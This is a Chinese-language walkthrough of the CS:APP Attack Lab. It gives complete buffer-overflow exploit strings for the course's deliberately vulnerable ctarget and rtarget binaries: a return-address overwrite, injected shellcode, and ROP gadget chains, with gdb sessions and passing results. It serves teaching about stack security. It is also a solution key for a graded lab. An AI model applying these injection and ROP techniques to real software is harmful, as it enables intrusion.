# Attack Lab

## 介绍

对2个有不同安全漏洞的程序进行5次攻击，完成后你将会收获：

- 学会针对缓冲区溢出漏洞进行攻击。
- 学会如何将程序写的更加安全，了解操作系统和编译的特征使程序出现更少的漏洞。
- 对x86-64机器代码的堆栈和参数传递有更深的理解。
- 对x86-64机器指令解码有更深的理解。
- 对gdb工具的熟练使用。

[实验帮助文档](http://csapp.cs.cmu.edu/3e/attacklab.pdf)

## Part I: Code Injection Attacks

前三个阶段利用**漏洞利用**字符串攻击`CTarget`。

### Level1

阶段1不需要代码注入，相反使用**漏洞利用**字符串就可以重定向程序执行另一现有程序。

`getbuf`函数在`CTarget`中被`test`函数被调用。

![](https://s3.ax1x.com/2021/01/02/rzfeat.png)

`getbuf`函数返回后会接着执行第5句代码，现在我们想改变这个行为。

![](https://s3.ax1x.com/2021/01/02/rzfaGT.png)

你的任务是改变程序执行方向，在`getbuf`函数返回后执行`touch1`函数。请注意，您的**漏洞利用**字符串可能还会破坏与该阶段不直接相关的堆栈部分，但这不会引起问题，因为`touch1`会导致程序直接退出。

思路是我们将`touch1`的起始地址的字节序列转为字符串后复写在返回地址在堆栈的位置。

首先我们使用反汇编查看一下`getbuf`和`touch1`函数。

```bash
(gdb) disas getbuf
Dump of assembler code for function getbuf:
   0x00000000004017a8 <+0>:     sub    $0x28,%rsp
   0x00000000004017ac <+4>:     mov    %rsp,%rdi
   0x00000000004017af <+7>:     callq  0x401a40 <Gets>
   0x00000000004017b4 <+12>:	mov    $0x1,%eax
   0x00000000004017b9 <+17>:	add    $0x28,%rsp
   0x00000000004017bd <+21>:	retq
End of assembler dump.
(gdb) disas touch1
Dump of assembler code for function touch1:
   0x00000000004017c0 <+0>:     sub    $0x8,%rsp
   0x00000000004017c4 <+4>:     movl   $0x1,0x202d0e(%rip)        # 0x6044dc <vlevel>
   0x00000000004017ce <+14>:	mov    $0x4030c5,%edi
   0x00000000004017d3 <+19>:	callq  0x400cc0 <puts@plt>
   0x00000000004017d8 <+24>:	mov    $0x1,%edi
   0x00000000004017dd <+29>:	callq  0x401c8d <validate>
   0x00000000004017e2 <+34>:	mov    $0x0,%edi
   0x00000000004017e7 <+39>:	callq  0x400e40 <exit@plt>
End of assembler dump.
```

字符串的地址是`%rsp-0x28`，`getbuf`函数的返回地址是在`%rsp`。我们只需将`touch1`的地址`0x4017c0`写在返回地址即可。

构造字符串字节序列。

```bash
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 # 0x28的空间
c0 17 40 00 00 00 00 00 # touch1函数的地址 / retq的返回地址
```

注意字节排列需要还与机器的**大小端**有关。我这里使用的机器是小端模式（数据的高字节保存在内存的高地址中）。

我们再使用`hex2raw`工具将字节序列转为字符串。

```bash
./hex2raw < attack1.txt > attackraw1.txt
```

接着拿我们得到的字符串去做检测。

```bash
root@5139ac651595:/csapp/target1# ./ctarget -q -i attackraw1.txt
Cookie: 0x59b997fa
Touch1!: You called touch1()
Valid solution for level 1 with target ctarget
PASS: Would have posted the following:
	user id	bovik
	course	15213-f15
	lab	attacklab
	result	1:PASS:0xffffffff:ctarget:1:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 C0 17 40 00 00 00 00 00
```

### Level2

阶段2在漏洞利用字符串里注入一小段代码。

![](https://s3.ax1x.com/2021/01/02/rzb9i9.png)

你的任务是`getbuf`函数之后执行到`touch2`函数而不是返回`test`函数。你需要将你的`cookie`传入到`touch2`函数。实验文件夹下有一个的`cookie.txt`，记录了你的`cookie`。

思路仍是在复写堆栈中返回地址字节序列。我们可以利用字符串空间注入代码，将返回地址执行字符串首地址执行注入代码从而跳转到`touch2`函数。

注入代码需要的内容：

1. 将cookie放入`%rdi`第一个参数寄存器中。
2. 将`touch2`函数地址推入堆栈中。
3. 然后执行`retq`，调用`touch2`函数。

于是我们可以得到代码汇编代码：

```assembly
movq $0x59b997fa,%rdi
pushq $0x4017ec
retq
```

将其转为目标代码：

```bash
gcc -c attack2.s

# 然后再反汇编
objdump -d attack2.o

attack2.o:     file format elf64-x86-64


Disassembly of section .text:

0000000000000000 <.text>:
   0:	48 c7 c7 fa 97 b9 59 	mov    $0x59b997fa,%rdi
   7:	68 ec 17 40 00       	pushq  $0x4017ec
   c:	c3                   	retq
```

我们注入代码的字节序列便是`48 c7 c7 ... c3`。

```bash
(gdb) disas getbuf
Dump of assembler code for function getbuf:
   0x00000000004017a8 <+0>:	sub    $0x28,%rsp
   0x00000000004017ac <+4>:	mov    %rsp,%rdi
   0x00000000004017af <+7>:	callq  0x401a40 <Gets>
   0x00000000004017b4 <+12>:	mov    $0x1,%eax
   0x00000000004017b9 <+17>:	add    $0x28,%rsp
   0x00000000004017bd <+21>:	retq
End of assembler dump.
(gdb) break *0x00000000004017af
Breakpoint 1 at 0x4017af: file buf.c, line 14.
(gdb) run -q
Starting program: /csapp/target1/ctarget -q
warning: Error disabling address space randomization: Operation not permitted
Cookie: 0x59b997fa

Breakpoint 1, 0x00000000004017af in getbuf () at buf.c:14
14	buf.c: No such file or directory.
(gdb) p /x $rsp
$1 = 0x5561dc78
```

我们得到字符串起始地址是`%rsp`的值0x5561dc78。便可以构造字节序列。

```bash
48 c7 c7 fa 97 b9 59 68 # 注入代码
ec 17 40 00 c3 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
78 dc 61 55 00 00 00 00 # 字符串起始地址
```

利用工具将字节序列转为字符串。 

```bash
root@5139ac651595:/csapp/target1# ./hex2raw < attack2.txt > attckraw2.txt
root@5139ac651595:/csapp/target1# ./ctarget -q -i attackraw2.txt
Cookie: 0x59b997fa
Touch2!: You called touch2(0x59b997fa)
Valid solution for level 2 with target ctarget
PASS: Would have posted the following:
	user id	bovik
	course	15213-f15
	lab	attacklab
	result	1:PASS:0xffffffff:ctarget:2:48 C7 C7 FA 97 B9 59 68 EC 17 40 00 C3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 DC 61 55 00 00 00 00
```

### Level3

阶段3依然包含一个代码注入攻击但传递的参数是字符串。

![](https://s3.ax1x.com/2021/01/02/sSej9s.png)

![](https://s3.ax1x.com/2021/01/02/sSm9BT.png)

你的任务是执行`touch3`而不是返回`test`函数，将`cookie`作为函数参数传递给`touch3`函数。

与**Level2**的区别是：

1. 传递的参数不是一个立即数，而是一个地址。
2. 在`hexmatch`函数中会申请110个字节的栈空间，这有可能覆盖`getbuf`字符串空间。

所以我们不能讲`cookie`的值存在字符串空间内，我们可以存在`test`函数的栈帧中这样就不会被后面调用的函数破坏。

`cookie`对应的字节序列是`35 39 62 39 39 37 66 61`。

我们通过gdb调试可以得到字符串的地址是`0x5561dc78`，字符串开辟的空间是`0x28`，我们将`%rsp+0x28`处写入字符串的地址，在`%rsp+0x30`处（该处为test函数的栈帧）写入`cookie`字符串序列。

创建注入代码`attack3.s`。

```assembly
movq $0x5561dca8,%rdi # 将cookie字符串地址赋给%rdi
pushq $0x4018fa # touch3函数的首地址
retq
```

然后编译成目标代码，反汇编得到注入代码指令字节序列。

```bash
root@5139ac651595:/csapp/target1# gcc -c attack3.s
root@5139ac651595:/csapp/target1# objdump -d attack3.o

attack3.o:     file format elf64-x86-64


Disassembly of section .text:

0000000000000000 <.text>:
   0:	48 c7 c7 a8 dc 61 55 	mov    $0x5561dca8,%rdi
   7:	68 fa 18 40 00       	pushq  $0x4018fa
   c:	c3                   	retq
```

我们便可以构造输入字符串序列。

```bash
48 c7 c7 a8 dc 61 55 68 # 注入代码 %rsp
fa 18 40 00 c3 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
78 dc 61 55 00 00 00 00 # touch3函数地址 %rsp + 28
35 39 62 39 39 37 66 61 # cookie字符串字节序列 %rsp + 30 test函数栈帧
```

```bash
root@5139ac651595:/csapp/target1# ./hex2raw < attack3.txt > attackraw3.txt
root@5139ac651595:/csapp/target1# ./ctarget -q -i attackraw3.txt
Cookie: 0x59b997fa
Touch3!: You called touch3("59b997fa")
Valid solution for level 3 with target ctarget
PASS: Would have posted the following:
	user id	bovik
	course	15213-f15
	lab	attacklab
	result	1:PASS:0xffffffff:ctarget:3:48 C7 C7 A8 DC 61 55 68 FA 18 40 00 C3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 DC 61 55 00 00 00 00 35 39 62 39 39 37 66 61
```

##  Part II: Return-Oriented Programming

采用以下两种技术对抗**漏洞利用**字符串技术：

- 随机化。每次运行时栈位置不同，导致无法注入代码。
- 将保存栈的区域设置为不可执行，设置权限保护。

**ROP技术**使用现有代码中的二进制指令序列使其组合成一系列读写内存、算术运算等操作，构造一段代码链来实现攻击。

### Level2

对于阶段4，你将需要重复阶段2的攻击，但是是在`RTARGET`程序中使用`gadget`完成。你可以使用以下指令组成的`gadget`来构造解决方案。

- movq
- popq
- ret：编码为单字节0xc3。
- nop：无操作，被编码为单字节0x90。会使程序计数器加1。

![](https://s3.ax1x.com/2021/01/03/s97OFe.png)

![](https://s3.ax1x.com/2021/01/03/s97jWd.png)

![](https://s3.ax1x.com/2021/01/03/s9HCef.png)

使用`objdump -d rtarget > rtarget.txt`命令后在反汇编代码的`start_farm`和`mid_farm`中构造`gadget`。

```assembly
0000000000401994 <start_farm>:
  401994:	b8 01 00 00 00       	mov    $0x1,%eax
  401999:	c3                   	retq   

000000000040199a <getval_142>:
  40199a:	b8 fb 78 90 90       	mov    $0x909078fb,%eax
  40199f:	c3                   	retq   

00000000004019a0 <addval_273>:
  4019a0:	8d 87 48 89 c7 c3    	lea    -0x3c3876b8(%rdi),%eax
  4019a6:	c3                   	retq   

00000000004019a7 <addval_219>:
  4019a7:	8d 87 51 73 58 90    	lea    -0x6fa78caf(%rdi),%eax
  4019ad:	c3                   	retq   

00000000004019ae <setval_237>:
  4019ae:	c7 07 48 89 c7 c7    	movl   $0xc7c78948,(%rdi)
  4019b4:	c3                   	retq   

00000000004019b5 <setval_424>:
  4019b5:	c7 07 54 c2 58 92    	movl   $0x9258c254,(%rdi)
  4019bb:	c3                   	retq   

00000000004019bc <setval_470>:
  4019bc:	c7 07 63 48 8d c7    	movl   $0xc78d4863,(%rdi)
  4019c2:	c3                   	retq   

00000000004019c3 <setval_426>:
  4019c3:	c7 07 48 89 c7 90    	movl   $0x90c78948,(%rdi)
  4019c9:	c3                   	retq   

00000000004019ca <getval_280>:
  4019ca:	b8 29 58 90 c3       	mov    $0xc3905829,%eax
  4019cf:	c3                   	retq   

00000000004019d0 <mid_farm>:
  4019d0:	b8 01 00 00 00       	mov    $0x1,%eax
  4019d5:	c3                   	retq
```

我们的任务是从`getbuf`函数返回执行`touch2`函数，将`cookie`参数传递给`touch2`。故需要将`cookie`传给`%rdi`寄存器。

我们可以构造以下汇编代码：

```assembly
popq %rax # 58
retq # c3
movq %rax,%rdi # 48 89 c7
retq # c3
```

利用给的指令字节码表我们可以找到对应的字节码。在给定范围的汇编代码中找到相应的连续字节码构造`gadget`。

我们可以得到字节系列。

```bash
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
ab 19 40 00 00 00 00 00 # popq指令的地址
fa 97 b9 59 00 00 00 00 # cookie的值
a2 19 40 00 00 00 00 00 # movq指令的地址
ec 17 40 00 00 00 00 00 # touch2的地址
```

也就是在`getbuf`函数执行完后首先跳到`0x4019ab`地址执行`popq`指令将`cookie`的值赋给`%rax`寄存器，然后执行`c3 retq`跳转到`0x4019a2`地址执行`movq`指令，最后跳转到`0x4017ec`的`touch2`函数。

```bash
root@5139ac651595:/csapp/target1# ./hex2raw < attack4.txt > attackraw4.txt
root@5139ac651595:/csapp/target1# ./rtarget -q -i attackraw4.txt
Cookie: 0x59b997fa
Touch2!: You called touch2(0x59b997fa)
Valid solution for level 2 with target rtarget
PASS: Would have posted the following:
	user id	bovik
	course	15213-f15
	lab	attacklab
	result	1:PASS:0xffffffff:rtarget:2:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 AB 19 40 00 00 00 00 00 FA 97 B9 59 00 00 00 00 A2 19 40 00 00 00 00 00 EC 17 40 00 00 00 00 00
```

### Level3

阶段5要求你对`RTARGET`程序使用**ROP**攻击，使用`cookie`的指针作为参数传递给`touch3`函数。

在`start_farm`和`end_farm`之间构造8个`gadget`实现**ROP攻击**。

```assembly
0000000000401994 <start_farm>:
  401994: b8 01 00 00 00        mov    $0x1,%eax
  401999: c3                    retq   

000000000040199a <getval_142>:
  40199a: b8 fb 78 90 90        mov    $0x909078fb,%eax
  40199f: c3                    retq   

00000000004019a0 <addval_273>:
  4019a0: 8d 87 48 89 c7 c3     lea    -0x3c3876b8(%rdi),%eax
  4019a6: c3                    retq   

00000000004019a7 <addval_219>:
  4019a7: 8d 87 51 73 58 90     lea    -0x6fa78caf(%rdi),%eax
  4019ad: c3                    retq   

00000000004019ae <setval_237>:
  4019ae: c7 07 48 89 c7 c7     movl   $0xc7c78948,(%rdi)
  4019b4: c3                    retq   

00000000004019b5 <setval_424>:
  4019b5: c7 07 54 c2 58 92     movl   $0x9258c254,(%rdi)
  4019bb: c3                    retq   

00000000004019bc <setval_470>:
  4019bc: c7 07 63 48 8d c7     movl   $0xc78d4863,(%rdi)
  4019c2: c3                    retq   

00000000004019c3 <setval_426>:
  4019c3: c7 07 48 89 c7 90     movl   $0x90c78948,(%rdi)
  4019c9: c3                    retq   

00000000004019ca <getval_280>:
  4019ca: b8 29 58 90 c3        mov    $0xc3905829,%eax
  4019cf: c3                    retq   

00000000004019d0 <mid_farm>:
  4019d0: b8 01 00 00 00        mov    $0x1,%eax
  4019d5: c3                    retq   

00000000004019d6 <add_xy>:
  4019d6: 48 8d 04 37           lea    (%rdi,%rsi,1),%rax
  4019da: c3                    retq   

00000000004019db <getval_481>:
  4019db: b8 5c 89 c2 90        mov    $0x90c2895c,%eax
  4019e0: c3                    retq   

00000000004019e1 <setval_296>:
  4019e1: c7 07 99 d1 90 90     movl   $0x9090d199,(%rdi)
  4019e7: c3                    retq   

00000000004019e8 <addval_113>:
  4019e8: 8d 87 89 ce 78 c9     lea    -0x36873177(%rdi),%eax
  4019ee: c3                    retq   

00000000004019ef <addval_490>:
  4019ef: 8d 87 8d d1 20 db     lea    -0x24df2e73(%rdi),%eax
  4019f5: c3                    retq   

00000000004019f6 <getval_226>:
  4019f6: b8 89 d1 48 c0        mov    $0xc048d189,%eax
  4019fb: c3                    retq   

00000000004019fc <setval_384>:
  4019fc: c7 07 81 d1 84 c0     movl   $0xc084d181,(%rdi)
  401a02: c3                    retq   

0000000000401a03 <addval_190>:
  401a03: 8d 87 41 48 89 e0     lea    -0x1f76b7bf(%rdi),%eax
  401a09: c3                    retq   

0000000000401a0a <setval_276>:
  401a0a: c7 07 88 c2 08 c9     movl   $0xc908c288,(%rdi)
  401a10: c3                    retq   

0000000000401a11 <addval_436>:
  401a11: 8d 87 89 ce 90 90     lea    -0x6f6f3177(%rdi),%eax
  401a17: c3                    retq   

0000000000401a18 <getval_345>:
  401a18: b8 48 89 e0 c1        mov    $0xc1e08948,%eax
  401a1d: c3                    retq   

0000000000401a1e <addval_479>:
  401a1e: 8d 87 89 c2 00 c9     lea    -0x36ff3d77(%rdi),%eax
  401a24: c3                    retq   

0000000000401a25 <addval_187>:
  401a25: 8d 87 89 ce 38 c0     lea    -0x3fc73177(%rdi),%eax
  401a2b: c3                    retq   

0000000000401a2c <setval_248>:
  401a2c: c7 07 81 ce 08 db     movl   $0xdb08ce81,(%rdi)
  401a32: c3                    retq   

0000000000401a33 <getval_159>:
  401a33: b8 89 d1 38 c9        mov    $0xc938d189,%eax
  401a38: c3                    retq   

0000000000401a39 <addval_110>:
  401a39: 8d 87 c8 89 e0 c3     lea    -0x3c1f7638(%rdi),%eax
  401a3f: c3                    retq   

0000000000401a40 <addval_487>:
  401a40: 8d 87 89 c2 84 c0     lea    -0x3f7b3d77(%rdi),%eax
  401a46: c3                    retq   

0000000000401a47 <addval_201>:
  401a47: 8d 87 48 89 e0 c7     lea    -0x381f76b8(%rdi),%eax
  401a4d: c3                    retq   

0000000000401a4e <getval_272>:
  401a4e: b8 99 d1 08 d2        mov    $0xd208d199,%eax
  401a53: c3                    retq   

0000000000401a54 <getval_155>:
  401a54: b8 89 c2 c4 c9        mov    $0xc9c4c289,%eax
  401a59: c3                    retq   

0000000000401a5a <setval_299>:
  401a5a: c7 07 48 89 e0 91     movl   $0x91e08948,(%rdi)
  401a60: c3                    retq   

0000000000401a61 <addval_404>:
  401a61: 8d 87 89 ce 92 c3     lea    -0x3c6d3177(%rdi),%eax
  401a67: c3                    retq   

0000000000401a68 <getval_311>:
  401a68: b8 89 d1 08 db        mov    $0xdb08d189,%eax
  401a6d: c3                    retq   

0000000000401a6e <setval_167>:
  401a6e: c7 07 89 d1 91 c3     movl   $0xc391d189,(%rdi)
  401a74: c3                    retq   

0000000000401a75 <setval_328>:
  401a75: c7 07 81 c2 38 d2     movl   $0xd238c281,(%rdi)
  401a7b: c3                    retq   

0000000000401a7c <setval_450>:
  401a7c: c7 07 09 ce 08 c9     movl   $0xc908ce09,(%rdi)
  401a82: c3                    retq   

0000000000401a83 <addval_358>:
  401a83: 8d 87 08 89 e0 90     lea    -0x6f1f76f8(%rdi),%eax
  401a89: c3                    retq   

0000000000401a8a <addval_124>:
  401a8a: 8d 87 89 c2 c7 3c     lea    0x3cc7c289(%rdi),%eax
  401a90: c3                    retq   

0000000000401a91 <getval_169>:
  401a91: b8 88 ce 20 c0        mov    $0xc020ce88,%eax
  401a96: c3                    retq   

0000000000401a97 <setval_181>:
  401a97: c7 07 48 89 e0 c2     movl   $0xc2e08948,(%rdi)
  401a9d: c3                    retq   

0000000000401a9e <addval_184>:
  401a9e: 8d 87 89 c2 60 d2     lea    -0x2d9f3d77(%rdi),%eax
  401aa4: c3                    retq   

0000000000401aa5 <getval_472>:
  401aa5: b8 8d ce 20 d2        mov    $0xd220ce8d,%eax
  401aaa: c3                    retq   

0000000000401aab <setval_350>:
  401aab: c7 07 48 89 e0 90     movl   $0x90e08948,(%rdi)
  401ab1: c3                    retq   

0000000000401ab2 <end_farm>:
  401ab2: b8 01 00 00 00        mov    $0x1,%eax
  401ab7: c3                    retq   
  401ab8: 90                    nop
  401ab9: 90                    nop
  401aba: 90                    nop
  401abb: 90                    nop
  401abc: 90                    nop
  401abd: 90                    nop
  401abe: 90                    nop
  401abf: 90                    nop
```

由于我们无法确定每次的栈空间地址，我们只能用栈顶的偏移量来计算`cookie`字符串的地址，我们发现反汇编代码中有一句特殊代码`lea (%rdi,%rsi,1),%eax`。我们将栈顶+字符串偏移取到字符串的地址，根据此逻辑我们写出：

```assembly
movq %rsp,%rax 
movq %rax,%rdi # 记录栈顶指针
popq %rax
movq %rax,%rsi # 记录cookie字符串的偏移量
lea (%rdi,%rsi,1),%rax # cookie字符串地址
movq %rax,%rdi
retq touch3
```

由于我们有些指令的字节序列无法直接找到，我们需要结合给出的字节代码序列来构造符号的汇编代码：

```assembly
movq %rsp,%rax
retq
movq %rax,%rdi
retq
popq %rax
retq
movl %rax,%rdx
retq
movl %rdx,%rcx
retq
movl %rcx,%rsi
retq
lea (%rdi,%rsi,1),%rax
retq
movq %rax,%rdi
retq
```

```bash
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
06 1a 40 00 00 00 00 00 # gadget1
a2 19 40 00 00 00 00 00 # gadget2
ab 19 40 00 00 00 00 00 # gadget3
48 00 00 00 00 00 00 00 # cookie字符串对栈顶的偏移量0x48
dd 19 40 00 00 00 00 00 # gadget4
34 1a 40 00 00 00 00 00 # gadget5
13 1a 40 00 00 00 00 00 # gadget6
d6 19 40 00 00 00 00 00 # gadget7
a2 19 40 00 00 00 00 00 # gadget8
fa 18 40 00 00 00 00 00 # touch3函数地址
35 39 62 39 39 37 66 61 # cookie
```

```bash
root@5139ac651595:/csapp/target1# ./hex2raw < attack5.txt > attackraw5.txt
root@5139ac651595:/csapp/target1# ./rtarget -q -i attackraw5.txt
Cookie: 0x59b997fa
Touch3!: You called touch3("59b997fa")
Valid solution for level 3 with target rtarget
PASS: Would have posted the following:
	user id	bovik
	course	15213-f15
	lab	attacklab
	result	1:PASS:0xffffffff:rtarget:3:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 06 1A 40 00 00 00 00 00 A2 19 40 00 00 00 00 00 AB 19 40 00 00 00 00 00 48 00 00 00 00 00 00 00 DD 19 40 00 00 00 00 00 34 1A 40 00 00 00 00 00 13 1A 40 00 00 00 00 00 D6 19 40 00 00 00 00 00 A2 19 40 00 00 00 00 00 FA 18 40 00 00 00 00 00 35 39 62 39 39 37 66 61
```

## 总结

**Attack Lab**是**Bomb Lab**后续篇章，经过这5个攻击阶段，虽然不能完全独立思路做出这些实验，甚至没想一会儿就去看解析，但是跟着网友的分析和命令行测试，也收获很多。特别是**栈帧的管理**，指令的执行与字节码，反汇编工具的使用，常见的缓冲区攻击和基础ROP攻击。